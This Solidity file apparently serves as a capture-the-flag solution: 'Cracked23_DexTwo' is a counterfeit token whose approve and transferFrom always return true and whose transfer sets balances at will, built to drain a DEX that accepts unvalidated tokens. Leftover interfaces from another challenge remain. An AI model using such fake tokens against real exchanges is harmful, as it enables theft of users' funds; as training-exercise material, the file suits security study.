// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint256);
}

interface IShop {
    function isSold() external returns (bool);
    function buy() external;
}

contract Cracked23_DexTwo {
    mapping(address => uint256) balances;
    function approve(address owner, address spender, uint256 amount) public returns (bool) {
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        return true;
    }
    function transfer(address adr, uint256 amount) public {
        balances[adr] = amount;
    }
    function balanceOf(address adr) public view returns (uint256) {
        return balances[adr];
    }
}

// pragma solidity ^0.8.0;
// import "openzeppelin-contracts_4.0.0/token/ERC20/ERC20.sol";
// interface Buyer {
//     function price() external view returns (uint256);
// }

// interface IShop {
//     function isSold() external returns (bool);
//     function buy() external;
// }

// contract Cracked23_DexTwo is ERC20 {
//     constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {
//         _mint(msg.sender, 1000000);
//     }
// }
